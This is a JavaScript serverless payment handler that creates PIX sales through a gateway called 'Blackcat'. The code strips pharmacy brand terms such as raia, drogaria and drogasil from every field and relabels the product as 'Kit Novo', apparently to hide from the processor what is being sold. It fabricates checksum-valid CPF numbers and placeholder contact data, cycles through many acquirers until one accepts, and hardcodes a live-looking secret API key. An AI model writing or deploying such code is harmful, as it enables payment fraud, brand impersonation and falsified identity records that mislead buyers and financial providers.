import QRCode from 'qrcode';

// Mascaramento server-side rígido:
// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref) {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email) {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val) {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function generateValidCPF() {
  const digits = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }
  let sum1 = 0;
  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  const rem1 = sum1 % 11;
  digits.push(rem1 < 2 ? 0 : 11 - rem1);

  let sum2 = 0;
  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  const rem2 = sum2 % 11;
  digits.push(rem2 < 2 ? 0 : 11 - rem2);

  return digits.join('');
}

function buildBlackcatPayload(input) {
  const amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;
  const externalRef = sanitizeReference(input?.reference || input?.externalRef);

  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';
  
  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
  if (!customerPhone || customerPhone.length < 10) {
    customerPhone = '11999999999';
  }

  let docNumber = input?.customer?.document?.number || input?.customer?.document;
  if (typeof docNumber === 'string') {
    docNumber = docNumber.replace(/\D/g, '');
  } else {
    docNumber = '';
  }
  if (!docNumber || docNumber.length < 11) {
    docNumber = generateValidCPF();
  }

  const payload = {
    amount,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: MASKED_PRODUCT_NAME,
        unitPrice: amount,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: docNumber,
        type: 'cpf',
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef,
    metadata: MASKED_PRODUCT_NAME,
  };

  const addr = input?.address || input?.shipping;
  if (addr && addr.street && addr.number) {
    const zipCode = addr.zipCode || addr.zipcode || '';
    const cleanZip = String(zipCode).replace(/\D/g, '');
    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);

    payload.shipping = {
      name: customerName,
      street: sanitizeText(addr.street) || addr.street,
      number: String(addr.number),
      complement: sanitizeText(addr.complement) || addr.complement || '',
      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
      state: cleanState,
      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
    };
  }

  return payload;
}

const BLACKCAT_ACQUIRERS = [
  'payzu',
  'suitpay',
  'asaas',
  'ezzebank',
  'celcoin',
  'primepag',
  'voluti',
  'mercadopago',
  'bspay',
  'fitbank',
  'iugu',
  'woovi',
  'starkbank',
  'santsbank',
  'fyhub',
  'pagsmile',
  null,
];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const apiKey =
    process.env.BLACKCAT_API_KEY ||
    process.env.BLACKCAT_SECRET_KEY ||
    'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';

  if (!apiKey) {
    return res.status(500).json({ success: false, error: 'BLACKCAT_API_KEY não configurada no servidor' });
  }

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
    const basePayload = buildBlackcatPayload(body);

    const acquirersToTry = body.acquirer
      ? [body.acquirer, ...BLACKCAT_ACQUIRERS.filter((a) => a !== body.acquirer)]
      : BLACKCAT_ACQUIRERS;

    let lastError = null;
    let lastData = null;
    let lastStatus = 500;

    for (const acquirer of acquirersToTry) {
      const currentPayload = { ...basePayload };
      if (acquirer) {
        currentPayload.acquirer = acquirer;
      } else {
        delete currentPayload.acquirer;
      }

      try {
        console.log(`[Blackcat Vercel] Tentando adquirente: ${acquirer || 'padrão'}`);
        const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-API-Key': apiKey,
          },
          body: JSON.stringify(currentPayload),
        });

        const data = await response.json();

        if (response.ok && data.success && data.data) {
          const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
          let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;

          if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
            try {
              qrCodeBase64 = await QRCode.toDataURL(qrCode, {
                width: 320,
                margin: 1,
                color: { dark: '#000000', light: '#ffffff' },
              });
            } catch (qrErr) {
              console.error('[Blackcat Vercel] Erro ao gerar QR Code base64:', qrErr);
            }
          }

          const formatted = {
            success: true,
            status: 'success',
            payment_status: data.data?.status?.toLowerCase() || 'pending',
            transaction_id: data.data?.transactionId || '',
            id: data.data?.transactionId || basePayload.externalRef,
            qr_code: qrCode,
            qr_code_base64: qrCodeBase64,
            amount: data.data?.amount || basePayload.amount,
            expires_at: data.data?.paymentData?.expiresAt || null,
            acquirer: acquirer || 'default',
            raw: data.data,
          };

          console.log(`[Blackcat Vercel] Sucesso com adquirente ${acquirer || 'padrão'}! TxID: ${formatted.transaction_id}`);
          return res.status(201).json({ success: true, data: formatted });
        }

        console.warn(`[Blackcat Vercel] Adquirente ${acquirer || 'padrão'} falhou (Status ${response.status}):`, data.message || data.error);
        lastError = data.message || data.error || 'Erro ao processar adquirente na Blackcat';
        lastData = data;
        lastStatus = response.status || 500;
      } catch (subErr) {
        console.warn(`[Blackcat Vercel] Exceção na adquirente ${acquirer || 'padrão'}:`, subErr.message);
        lastError = subErr.message;
      }
    }

    console.error('[Blackcat Vercel] Todas as adquirentes falharam. Último erro:', lastError);
    return res.status(lastStatus).json({
      success: false,
      error: lastError || 'Erro ao criar venda na Blackcat após tentar todas as adquirentes',
      raw: lastData,
    });
  } catch (err) {
    console.error('[Blackcat Vercel] Erro interno:', err);
    return res.status(500).json({ success: false, error: err.message || 'Erro interno no proxy Blackcat' });
  }
}

